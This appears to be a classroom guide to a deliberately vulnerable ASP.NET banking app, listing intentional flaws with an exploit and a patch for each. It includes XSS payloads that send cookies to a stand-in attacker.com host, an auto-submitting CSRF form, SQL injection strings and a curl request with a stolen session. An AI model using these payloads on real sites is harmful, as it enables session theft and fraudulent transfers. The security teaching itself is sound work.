Intentional Security Vulnerabilities:

1. No HTTPS
HTTPS redirection is commented out in Program.cs
2. No CSRF Protection
No antiforgery tokens on forms
Vulnerable to Cross-Site Request Forgery attacks
3. Plain Text Passwords
Passwords stored directly in database without hashing
Visible in Customer model
4. XSS Vulnerability
Transfer messages use @Html.Raw() - can inject malicious scripts
No input sanitization
5. Weak Session Management
HttpOnly set to false on cookies
Basic session storage without encryption
6. SQL Injection Risk
While EF Core helps prevent this, there's minimal validation
7. No Input Validation
Minimal validation on registration and transfers
No password strength requirements
8. Race Conditions
No database transactions for transfers
Balance checks not atomic
9. No Authorization Checks
Only basic session checks, easily bypassed

# Exploits

## 1. Lösenord i plain text

-- Students can open the SQLite database file (bank.db) with any SQLite browser
-- and see all passwords in plain text
SELECT Username, Password FROM Customers;

### Patch

-- Use a hashing algorithm like BCrypt to store passwords securely

```cs
// Install package: dotnet add package BCrypt.Net-Next

// In AuthController.Register:
using BCrypt.Net;

var customer = new Customer
{
    Username = username,
    Password = BCrypt.HashPassword(password), // Hash instead of plain text
    FullName = fullName
};

// In AuthController.Login:
var customer = _context.Customers
    .FirstOrDefault(c => c.Username == username);

if (customer != null && BCrypt.Verify(password, customer.Password))
{
    // Login successful
}
```

## 2. XSS (Cross-Site Scripting)

Exploit:

// When making a transfer, enter this in the message field:
<script>alert('XSS Attack! Cookie: ' + document.cookie)</script>

// Or steal session data:
<script>
  fetch('http://attacker.com/steal?data=' + document.cookie);
</script>

// Or redirect to phishing site:
<script>window.location='http://evil-bank.com'</script>

### Patch

// In Dashboard.cshtml, change:
<td>@Html.Raw(transfer.Message)</td>

// To:
<td>@transfer.Message</td>  // Auto-escapes HTML

// Or add validation in AccountController.Transfer:
if (!string.IsNullOrEmpty(message) && 
    (message.Contains("<") || message.Contains(">")))
{
    TempData["Error"] = "Invalid characters in message";
    return RedirectToAction("Dashboard");
}

## 3. CSRF (Cross-Site Request Forgery)

Exploit:

```html
<!-- Attacker creates malicious webpage: evil-site.html -->
<html>
<body>
  <h1>Click here for free money!</h1>
  <form id="stealForm" method="POST" 
        action="http://localhost:5000/Account/Transfer">
    <input type="hidden" name="toAccountNumber" value="1000002" />
    <input type="hidden" name="amount" value="5000" />
    <input type="hidden" name="message" value="Hacked!" />
  </form>
  <script>
    // Auto-submit when page loads
    document.getElementById('stealForm').submit();
  </script>
</body>
</html>

<!-- If logged-in user visits this page, money transfers automatically -->
 ```

### Patch

```cs
// 1. In Program.cs, add after builder.Services.AddControllersWithViews():
builder.Services.AddAntiforgery(options => 
{
    options.HeaderName = "X-CSRF-TOKEN";
});

// 2. In Transfer form (Dashboard.cshtml):
<form method="post" action="/Account/Transfer">
    @Html.AntiForgeryToken()  <!-- Add this -->
    <!-- rest of form -->
</form>

// 3. In AccountController.Transfer, add attribute:
[HttpPost]
[ValidateAntiForgeryToken]  // Add this
public IActionResult Transfer(string toAccountNumber, decimal amount, string message)
{
    // ...
}
```

## 4. SQL Injection

Exploit:

// While EF Core protects against basic SQL injection, 
// if you used raw SQL, this would be vulnerable:

// VULNERABLE CODE (not in your app, but to demonstrate):
var query = $"SELECT * FROM Customers WHERE Username = '{username}' AND Password = '{password}'";

// Exploit with username: admin' OR '1'='1
// Results in: SELECT * FROM Customers WHERE Username = 'admin' OR '1'='1' AND Password = ''
// This bypasses authentication!

### Patch

// Always use parameterized queries or ORM features that handle this for you
// With EF Core, you should be safe as long as you use LINQ or parameterized raw SQL.

## 5. 5. Session Hijacking & Insecure Cookies

Exploit:

```
// Since HttpOnly = false, JavaScript can access session cookies:
<script>
  console.log(document.cookie); // Shows session ID
  // Attacker can steal this and impersonate user
</script>

// Attack steps:
// 1. Use XSS to steal cookie, example:
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
// 2. Send to attacker's server
// 3. Attacker sets same cookie in their browser
// 4. Attacker is now logged in as victim
```

### Patch

```cs
// In Program.cs, change session configuration:
builder.Services.AddSession(options =>
{
    options.IdleTimeout = TimeSpan.FromMinutes(30);
    options.Cookie.HttpOnly = true;  // Change to true - prevents JS access
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always; // Requires HTTPS
    options.Cookie.SameSite = SameSiteMode.Strict; // Prevents CSRF
    options.Cookie.IsEssential = true;
});
```

## 6. No HTTPS

Exploit:

// Since HTTPS redirection is commented out, all traffic is in plain text
// An attacker on the same network can sniff traffic and steal credentials or session cookies
// Example: Using Wireshark, attacker captures login request.

### Patch

```cs
// In Program.cs, uncomment/add:
app.UseHttpsRedirection();
app.UseHsts();

// In launchSettings.json, ensure HTTPS URL is configured:
"applicationUrl": "https://localhost:5001;http://localhost:5000"

// Force HTTPS-only cookies (shown in Patch #5 above)
```

## 7. Race Conditions in Transfers

Exploit:

```cs
// Send multiple transfer requests simultaneously:
for (int i = 0; i < 10; i++)
{
    Task.Run(() => {
        // POST to /Account/Transfer with amount 9900 SEK
        // If account has 10000, all might succeed before balance updates
    });
}
// Attacker can spend more money than they have!
```

### Patch

```cs
// In AccountController.Transfer, wrap in transaction:
using var transaction = _context.Database.BeginTransaction();
try
{
    // Lock the account rows
    var fromAccount = _context.Accounts
        .Where(a => a.CustomerId == customerId)
        .FirstOrDefault();
    
    var toAccount = _context.Accounts
        .FirstOrDefault(a => a.AccountNumber == toAccountNumber);

    if (fromAccount.Balance < amount)
    {
        TempData["Error"] = "Insufficient funds";
        return RedirectToAction("Dashboard");
    }

    fromAccount.Balance -= amount;
    toAccount.Balance += amount;

    var transfer = new Transfer { /* ... */ };
    _context.Transfers.Add(transfer);
    
    _context.SaveChanges();
    transaction.Commit();
}
catch
{
    transaction.Rollback();
    throw;
}
```

## 8. Weak Input Validation

Exploit:

// Register with:
Username: <empty>
Password: a
FullName: <script>alert(1)</script>

// Transfer:
Amount: -5000  (negative numbers might work)
Amount: 999999999999999999 (integer overflow)
Message: '; DROP TABLE Customers; --

### Patch

```cs
// In AuthController.Register:
if (string.IsNullOrWhiteSpace(username) || username.Length < 3)
{
    ViewBag.Error = "Username must be at least 3 characters";
    return View();
}

if (string.IsNullOrWhiteSpace(password) || password.Length < 8)
{
    ViewBag.Error = "Password must be at least 8 characters";
    return View();
}

// Add regex validation:
if (!Regex.IsMatch(username, "^[a-zA-Z0-9_]+$"))
{
    ViewBag.Error = "Username can only contain letters, numbers, and underscores";
    return View();
}

// In AccountController.Transfer:
if (amount <= 0 || amount > 1000000)
{
    TempData["Error"] = "Invalid amount";
    return RedirectToAction("Dashboard");
}

if (string.IsNullOrWhiteSpace(toAccountNumber) || 
    !Regex.IsMatch(toAccountNumber, "^[0-9]+$"))
{
    TempData["Error"] = "Invalid account number";
    return RedirectToAction("Dashboard");
}
```

## 9. No Authorization Checks

```
// Attacker can manipulate session:
// 1. Login as User A (CustomerId = 1)
// 2. Open browser dev tools
// 3. Modify session storage or cookie
// 4. Change CustomerId to 2
// 5. Refresh - now viewing User B's account!

// Or use Postman/curl to send requests:
curl -X POST http://localhost:5000/Account/Transfer \
  -H "Cookie: .AspNetCore.Session=stolen_session" \
  -d "toAccountNumber=1000003&amount=1000&message=stolen"
```

### Patch

```cs
// Implement proper authorization checks:
// In AccountController, add:
[Authorize] // Requires user to be authenticated
public class AccountController : Controller
{
    // ...
}
// In Program.cs, add authentication services:
builder.Services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie(options =>
    {
        options.LoginPath = "/Auth/Login";
        options.Cookie.HttpOnly = true;
        options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
        options.Cookie.SameSite = SameSiteMode.Strict;
    });
```

or

```cs
// Create proper authentication with ASP.NET Core Identity
// Or at minimum, create a custom attribute:

public class RequireLoginAttribute : ActionFilterAttribute
{
    public override void OnActionExecuting(ActionExecutingContext context)
    {
        var customerId = context.HttpContext.Session.GetInt32("CustomerId");
        if (customerId == null)
        {
            context.Result = new RedirectToActionResult("Login", "Auth", null);
        }
    }
}

// Use it:
[RequireLogin]
public class AccountController : Controller
{
    // ...
}

// Better: Implement ASP.NET Core Identity for proper authentication and authorization management.
``` 

## 10. Information Disclosure

```
// Error messages reveal too much:
// - "User already exists" vs "Invalid credentials" (username enumeration)
// - Stack traces in development mode
// - Predictable account numbers (1000001, 1000002, etc.)
// Attackers can use this information to target specific accounts or users.
```

### Patch

```cs
// Generic error messages:
if (customer == null || !BCrypt.Verify(password, customer.Password))
{
    ViewBag.Error = "Invalid credentials"; // Don't reveal which field is wrong
    return View();
}

// Random account numbers:
var accountNumber = GenerateSecureAccountNumber();

private string GenerateSecureAccountNumber()
{
    using var rng = RandomNumberGenerator.Create();
    var bytes = new byte[4];
    rng.GetBytes(bytes);
    return (Math.Abs(BitConverter.ToInt32(bytes, 0)) % 90000000 + 10000000).ToString();
}

// Disable detailed errors in production (already in your code):
if (!app.Environment.IsDevelopment())
{
    app.UseExceptionHandler("/Home/Error");
    app.UseHsts();
}
```

# Tips

Demonstrate XSS first - It's visually impressive with alert boxes
Show CSRF - Create the malicious HTML page and test it
Database inspection - Open bank.db in DB Browser for SQLite to show plain text passwords
Network sniffing - Use browser dev tools Network tab to show unencrypted data
Patch incrementally - Have students Patch one vulnerability at a time and test